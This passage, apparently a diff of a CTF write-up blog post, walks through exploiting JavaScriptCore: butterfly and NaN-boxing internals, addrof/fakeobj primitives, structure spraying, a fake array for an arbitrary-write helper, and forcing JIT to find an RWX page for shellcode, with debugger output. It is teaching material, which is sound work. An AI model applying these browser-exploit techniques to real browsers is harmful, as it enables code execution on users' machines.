+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#a6e22e">bar</span>
+<span style="color:#a6e22e">deadbeef</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#a6e22e">bar</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cafebabe&#34;</span>
+<span style="color:#a6e22e">cafebabe</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#a6e22e">bar</span>
+<span style="color:#a6e22e">cafebabe</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#a6e22e">foo</span>
+<span style="color:#a6e22e">deadbeef</span>
+</code></pre></div><p>So parsing an address of a variable in memory, we can create a replicate of the object. Cool enough, this seems like it could be useful.</p>
+<p>What about the readmem primitive? This gives some funky output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">/* continued from before */</span> 
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#a6e22e">readmem</span>(<span style="color:#a6e22e">foo</span>)
+<span style="color:#66d9ef">undefined</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#a6e22e">readmem</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">foo</span>))
+<span style="color:#ae81ff">2.188048629506922</span><span style="color:#a6e22e">e</span><span style="color:#f92672">-</span><span style="color:#ae81ff">303</span>
+</code></pre></div><p>But what is this? Let&rsquo;s try to create a python helper function to unpack this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># python interpreter</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">import</span> struct
+<span style="color:#f92672">&gt;&gt;&gt;</span> readmem_out <span style="color:#f92672">=</span> <span style="color:#ae81ff">2.188048629506922e-303</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;Q&#34;</span>, struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;d&#34;</span>, readmem_out))[<span style="color:#ae81ff">0</span>]
+<span style="color:#ae81ff">78815192502255540</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> hex(<span style="color:#ae81ff">78815192502255540</span>)
+<span style="color:#e6db74">&#39;0x118020000003fb4&#39;</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span>
+</code></pre></div><p>What is this output? It certainly does not look like the &ldquo;deadbeef&rdquo; string. We need to dive more into the internal memory structures of JavaScript.</p>
+<h2 id="the-internal-memory-structures-of-javascript">The internal memory structures of JavaScript</h2>
+<p>(Thanks to LiveOverflow, and saelo for their ressources, links in the end).</p>
+<h3 id="the-butterfly-structure">The butterfly structure</h3>
+<p>Objects in JavaScript are essentially collections of properties which are
+stored as (key, value) pairs. Just like we have dictionaries in Python, HashMaps in Java, and so on. We all know JavaScript is weird, so it&rsquo;s no difference here! They also have something called &ldquo;exotic&rdquo; objects, whose properties are also called elements. This could be for example arrays.</p>
+<p>Internally JSC stores both properties and elements in the same part of memory. This means, that want we would like to have a clear separator between the two. This introduces the butterfly struct, which is called such, because we&rsquo;re given a pointer to the middle of the struct, and it expands to the left and right. It can be visualized as follows:</p>
+<p><img src="/pictures/butterfly.png" alt="Butterfly"></p>
+<p>So to the left of the pointer we have the length of the exotic object, along with properties, and then on the right side of the pointer we have elements in the exotic object. Now one could begin to wonder, what would happen if we try initializing an array of 10000, but only set index 0: <code>a = []; a[0] = 42</code>. Of course it shouldn&rsquo;t allocate a giant memory region for this, it will use an extra step and throw them back into another part of memory to not waste space. Okay, cool! Specifically we have:</p>
+<pre><code>ArrayWithInt32      = IsArray | Int32Shape;
+ArrayWithDouble     = IsArray | DoubleShape;
+ArrayWithContiguous = IsArray | ContiguousShape;
+</code></pre>
+<p>Here, the last type stores JSValues while the former two store their native
+types.</p>
+<h3 id="nan-boxing">NaN-boxing</h3>
+<p>All major JavaScript engines represent a value with no more than 8 bytes, yes, that&rsquo;s right! Only eight. This makes use of the fact that there exists multiple bit patterns, which all represent NaN. I don&rsquo;t really know if this is why, but I guess it would explain why we can do lots of dark magic to get Nan out, i.e. the classic &ldquo;JavaScript is weird&rdquo;: <code>BaNaNa</code>. But what can we use NaN for and why is the title of this segment &ldquo;NaN-boxing&rdquo;? This requires understanding that floats can have 2^52 explicitly stored significand precision bits. Now with JavaScript each fraction with all exponent bits set can be represented as NaN, except for 0. This leaves us with 2^51 bit patterns. Why exactly floats work as they do is dark magic to me still, and not really relevant. We know that only 48 bits are used for addresses, and since 51 &gt; 48 we can make use of NaNs to represent addresses in memory. This is also why when we tested previously we got floats out of everything, (addrof, readmem &hellip;).</p>
+<h2 id="exploitation-technique">Exploitation technique</h2>
+<h3 id="our-primitives">Our primitives</h3>
+<p>Now we have the luxurity of having addrof and fakeobj, but how do they work? We can just use them without figuring out, but &ldquo;teach a man to fish, &hellip;&rdquo;. So the way the addrof and fakeobj primitives work, is based on the weak typing of JavaScript. The fact that everything can be represented as doubles, means we for example could create an ArrayWithDouble, and have the JavaScript engine treat our ArrayWithDoubles as an ArrayWithContiguous, this is the addrof primitive. The fakeobj essentially works the other way around, we create an ArrayWithContiguous and inject native doubles into it, to get JSObject pointers. However we already have them! Nice:)</p>
+<h3 id="part-1-write-how">Part 1: Write? How?</h3>
+<p>So where do we want to write? Well first we want to figure out what kind of object we want to fake. I wanted to follow saelo&rsquo;s advice which was as above that we want to fake an ArrayWithDouble and have
+the JavaScript engine treat it as an ArrayWithContiguous. saelo writes following:</p>
+<pre tabindex="0"><code>Another slight complication arises since we cannot use arbitrary structure IDs.
+This is because there are also structures allocated for other garbage collected
+cells that are not JavaScript objects (strings, symbols, regular expression objects, 
+even structures themselves). Calling any method referenced by their method table will 
+lead to a crash due to a failed assertion. These structures are only allocated at engine 
+startup though, resulting in all of them having fairly low IDs.
+</code></pre><p>We fix this by spraying an array with doubles into memory like so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">structure_spray</span> <span style="color:#f92672">=</span> []
+<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">1000</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">array</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">13.37</span>];
+    <span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">13.37</span>;
+    <span style="color:#a6e22e">array</span>[<span style="color:#e6db74">&#39;p&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">13.37</span>;
+    <span style="color:#a6e22e">structure_spray</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">array</span>)
+}
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">victim</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">structure_spray</span>[<span style="color:#ae81ff">500</span>];
+</code></pre></div><p>This creates a structure_spray array, and pushes a lot of ArrayWithDoubles. Now we want to create a fake  object that looks like an ArrayOfContiguous based on this, so we can handle pointers (due to now using JSValues). This means that OUR double values will be ENCODED AS JSVALUES. Does this sound useful? It&rsquo;s because we can then fake pointers to memory! We now want to create a fake object, something like below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">outer</span> <span style="color:#f92672">=</span> {
+	<span style="color:#a6e22e">cell_header</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">flags_arr_contiguous</span>,
+	<span style="color:#a6e22e">butterfly</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">victim</span>,
+};
+</code></pre></div><p>Let&rsquo;s try debugging what happens with this address then, shall we? Don&rsquo;t worry too much about the &ldquo;flags_arr_contiguous&rdquo; part for now. Just know that it&rsquo;s essentially a structure header that says it&rsquo;s a contiguous array. We can debug with <code>lldb</code>. Running following commands gives us a gdb-like session:</p>
+<pre tabindex="0"><code>lldb jsc
+&gt;&gt; r -i poc.js
+</code></pre><p>Where poc.js is our spray and the fake outer struct. Now I implemented a bunch of helper functions to convert from integer to float, float to integer, integer to hex, just like I&rsquo;m used to in python, these will be in the final solve script, if you want to have a look at those. Let&rsquo;s look at our debugging session:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">(lldb) r <span style="color:#f92672">-</span>i poc<span style="color:#f92672">.</span>js
+Process <span style="color:#ae81ff">229787</span> launched: <span style="color:#e6db74">&#39;/home/cave/CTF/fe-ctf/finals/my-first-browserpwn/my-first-browserpwn/jsc&#39;</span> (x86_64)
+<span style="color:#f92672">&gt;&gt;&gt;</span> Process <span style="color:#ae81ff">229787</span> stopped
+<span style="color:#f92672">*</span> thread <span style="color:#75715e">#1, name = &#39;jsc&#39;, stop reason = signal SIGSTOP</span>
+    frame <span style="color:#75715e">#0: 0x00007ffff63749cc libc.so.6`__GI___libc_read at read.c:26:10</span>
+(lldb) c
+Process <span style="color:#ae81ff">229787</span> resuming
+addrof(outer)
+<span style="color:#ae81ff">6.95329221692873e-310</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> hex(f2i(<span style="color:#ae81ff">6.95329221692873e-310</span>))
+<span style="color:#ae81ff">0x7fffb3488000</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> Process <span style="color:#ae81ff">229787</span> stopped
+<span style="color:#f92672">*</span> thread <span style="color:#75715e">#1, name = &#39;jsc&#39;, stop reason = signal SIGSTOP</span>
+    frame <span style="color:#75715e">#0: 0x00007ffff63749cc libc.so.6`__GI___libc_read at read.c:26:10</span>
+(lldb) x<span style="color:#f92672">/</span><span style="color:#ae81ff">4</span>wgx <span style="color:#ae81ff">0x7fffb3488000</span>
+<span style="color:#ae81ff">0x7fffb3488000</span>: <span style="color:#ae81ff">0x010018000000c5a5</span> <span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x7fffb3488010</span>: <span style="color:#ae81ff">0x0109200900000200</span> <span style="color:#ae81ff">0x00007fffb34c1ee0</span>
+(lldb)
+<span style="color:#ae81ff">0x7fffb3488020</span>: <span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x7fffb3488030</span>: <span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#ae81ff">0x0000000000000000</span>
+</code></pre></div><p>We see a few interesting things here, specifically this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">(lldb) x<span style="color:#f92672">/</span><span style="color:#ae81ff">4</span>wgx <span style="color:#ae81ff">0x7fffb3488000</span>
+<span style="color:#ae81ff">0x7fffb3488000</span>: <span style="color:#ae81ff">0x010018000000c5a5</span> <span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x7fffb3488010</span>: <span style="color:#ae81ff">0x0109200900000200</span> <span style="color:#ae81ff">0x00007fffb34c1ee0</span>
+</code></pre></div><p>We see that the addrof our outer structure first has something that starts with <code>0x010018000000c5a5</code>. This is the JSCell. The second one the Butterfly pointer, which is null since all properties are stored inline. Next  is our fake contiguous array header, and then we have the address to our victim object. Now back to the funky <code>cell_header: flags_arr_contiguous,</code>, how do we know what to set this as? I just manually created an array I knew would be a contiguous array, and then used lldb to grab the cell headers, but it seems to be the same for lots of exploits. We need to subtract 0x10000, because of the way JavaScript deals with integers - this is not too important why, but Saelo goes into more detail in his phrack paper. Cool, now we have a bit more code to add to the top of our exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x01082007</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10000</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flags_arr_double</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>];
+
+<span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x01082009</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10000</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flags_arr_contiguous</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>];
+</code></pre></div><p>But wait! what is this u32 and f64? I know it&rsquo;s a lot, bear over with me. This is how we are going to be adding numbers in our exploit, to only add 32-bits, such that we can only change the upper or lower half or sometimes both. The helper functions are as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">u32</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint32Array</span>(<span style="color:#a6e22e">buf</span>)
+<span style="color:#a6e22e">f64</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#a6e22e">buf</span>)
+</code></pre></div><p>So of course we want to make the fake object from our fake cell header, not the outer object, so we add 0x10:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">outer</span>)
+<span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x10</span>
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hax</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>]);
+</code></pre></div><p>Now let&rsquo;s try writing to <code>hax[1]</code>,  just a bunch of garbage data. We now want to follow the butterfly pointer, because that&rsquo;s where we&rsquo;re going to be writing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> hex(f2i(addrof(hax)))
+<span style="color:#ae81ff">0x7fffb3488010</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> Process <span style="color:#ae81ff">246776</span> stopped
+<span style="color:#f92672">*</span> thread <span style="color:#75715e">#1, name = &#39;jsc&#39;, stop reason = signal SIGSTOP</span>
+    frame <span style="color:#75715e">#0: 0x00007ffff63749cc libc.so.6`__GI___libc_read at read.c:26:10</span>
+(lldb) x<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>wgx <span style="color:#ae81ff">0x7fffb3488010</span>
+<span style="color:#ae81ff">0x7fffb3488010</span>: <span style="color:#ae81ff">0x0109200900000200</span> <span style="color:#ae81ff">0x00007fffb34c1fa0</span>
+(lldb) x<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>wgx <span style="color:#ae81ff">0x00007fffb34c1fa0</span>
+<span style="color:#ae81ff">0x7fffb34c1fa0</span>: <span style="color:#ae81ff">0x010824070000545c</span> <span style="color:#ae81ff">0x00007fe02a4ca188</span>
+(lldb)
+<span style="color:#ae81ff">0x7fffb34c1fb0</span>: <span style="color:#ae81ff">0x010824070000547b</span> <span style="color:#ae81ff">0x00007fe02a4ca1b8</span>
+</code></pre></div><p>Let&rsquo;s try with a bunch of A&rsquo;s (<code>&gt;&gt;&gt; hax[1] = 0x41414141414141414141414141414141</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">(lldb) x<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>wgx <span style="color:#ae81ff">0x00007fffb34c1fa0</span>
+<span style="color:#ae81ff">0x7fffb34c1fa0</span>: <span style="color:#ae81ff">0x0108240700004f98</span> <span style="color:#ae81ff">0x47d2505050505050</span>
+(lldb)
+<span style="color:#ae81ff">0x7fffb34c1fb0</span>: <span style="color:#ae81ff">0x0108240700004fa8</span> <span style="color:#ae81ff">0x00007ff8236ca1b8</span>
+</code></pre></div><p>We see that something clearly changed. We now want a way to control what&rsquo;s written. Remember from before, when we talked about how ArrayOfContiguous could handle pointers, and ArrayOfDoubles could not, but we could put in what we later wanted to be pointers? To do this we introduce two new functions, typically called unboxed, and boxed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">unboxed</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>]
+<span style="color:#a6e22e">unboxed</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">4.2</span> <span style="color:#75715e">// convert `CopyOnWriteArrayWithDoubles` to `ArrayWithDoubles`
+</span><span style="color:#75715e"></span>			     <span style="color:#75715e">// read that this was to avoid JSC optimizing unboxed to a wrong type
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">boxed</span> <span style="color:#f92672">=</span> [{}];
+</code></pre></div><p>So we create an unboxed function for handling when we want to change a value, and boxed for when we want it to be seen as a pointer. We now want to change the victim butterfly, so we can control where we&rsquo;re writing. We can do this as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">hax</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">unboxed</span> <span style="color:#75715e">// change the value to be of type unboxed
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tmp_butterfly</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">victim</span>[<span style="color:#ae81ff">1</span>]; <span style="color:#75715e">// get the current butterfly, we&#39;re now dealing with doubles
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">hax</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">boxed</span> <span style="color:#75715e">// change the value to contiguous
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">victim</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span>  <span style="color:#a6e22e">tmp_butterfly</span>; <span style="color:#75715e">// write the double pointer in, we now control the ptr
+</span></code></pre></div><p>Now remember how we previously defined the outer, with the flags_contiguous? Meaning that it doesn&rsquo;t really handle doubles very well? Well to use all this work we need to change outers header to be the flags for double, I spent a couple of 6 hours here missing why it wasn&rsquo;t working. So don&rsquo;t worry if it&rsquo;s confusing. it just is.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">outer</span>.<span style="color:#a6e22e">cell_header</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">flags_arr_double</span>
+</code></pre></div><p>I would love to draw a nice flow chart of what exactly is happening here, and make it animated, but LiveOverflow already did at <a href="https://liveoverflow.com/preparing-for-stage-2-of-a-webkit-exploit/">https://liveoverflow.com/preparing-for-stage-2-of-a-webkit-exploit/</a>. I highly recommend checking that out before continuing here, to fully understand the flow.</p>
+<p>Now we&rsquo;re practically done, we need to create a helper function that just writes, but that&rsquo;s pretty simple now with all this preparation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">write64</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">where</span>, <span style="color:#a6e22e">what</span>) {
+     <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">where</span>
+     <span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x10</span>
+     <span style="color:#a6e22e">hax</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>]
+     <span style="color:#a6e22e">victim</span>.<span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">what</span>
+}
+</code></pre></div><h3 id="part-2-what-to-write">Part 2: What to write</h3>
+<p>So now we can write, but what to we write, and where? We&rsquo;ll, the thing is, this is almost just plain old pwn now. We can actually just write shellcode! We just need a Read-Write-Executable page, but how in the world, are we going to find that? I thought those were extinct. However a nice thing about JavaScript engines is that they all use Just-In-Time (JIT) compiling, which requires writing instructions into a page and later executing them. See an issue here? Write, AND execute? This means that JSC wil lallocate memory regions that are RWX. We want to write here! But how do we find such a region? Also, how do we get such a region?</p>
+<h4 id="part-21-jit-gud-n00b">Part 2.1: JIT gud n00b</h4>
+<p>The JIT compiler for JavaScript is pretty cool, and can JIT your code in different levels, depending on how many times the code needs to run. Code that needs to run a lot? That needs to be fast! Makes sense! So to get some jitted code we simply run a function many times:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">makeJITCompiledFunction</span>() {
+    <span style="color:#75715e">// Some code to avoid inlining...
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">target</span>(<span style="color:#a6e22e">num</span>) {
+        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">num</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">num</span> <span style="color:#f92672">%</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>) {
+                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+            }
+        }
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+    }
+
+    <span style="color:#75715e">// Force JIT compilation.
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1000</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#a6e22e">target</span>(<span style="color:#a6e22e">i</span>);
+    }
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1000</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#a6e22e">target</span>(<span style="color:#a6e22e">i</span>);
+    }
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1000</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#a6e22e">target</span>(<span style="color:#a6e22e">i</span>);
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">target</span>;
+}
+</code></pre></div><p>I just stole this from saelo&rsquo;s paper, and found out quickly enough, that it worked finely.</p>
+<h4 id="part-22-finding-the-jit">Part 2.2: Finding the JIT</h4>
+<p>Now, I assumed, hey! Let&rsquo;s just run addrof on this function and we would have the RWX segment, but that&rsquo;s not quite how the JavaScript engines works, probably for a plethora of reasons. After some time I found out about pwndbg&rsquo;s function called &ldquo;leakfind&rdquo; , and quite quickly I got a bunch of targets:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">pwndbg<span style="color:#f92672">&gt;</span> leakfind <span style="color:#ae81ff">0x00007fffb34e5f00</span>
+
+<span style="color:#f92672">...</span>
+
+<span style="color:#ae81ff">0x7fffb34e5f00</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffff38b1000</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x55555557a718</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x555555572210</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>cave<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>fe<span style="color:#f92672">-</span>ctf<span style="color:#f92672">/</span>finals<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>jsc
+<span style="color:#ae81ff">0x7fffb34e5f00</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffff38b1000</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x55555557a718</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x8</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x555555572980</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>cave<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>fe<span style="color:#f92672">-</span>ctf<span style="color:#f92672">/</span>finals<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>jsc
+<span style="color:#ae81ff">0x7fffb34e5f00</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffff38b1000</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x55555557a718</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x55555556c630</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>cave<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>fe<span style="color:#f92672">-</span>ctf<span style="color:#f92672">/</span>finals<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>jsc
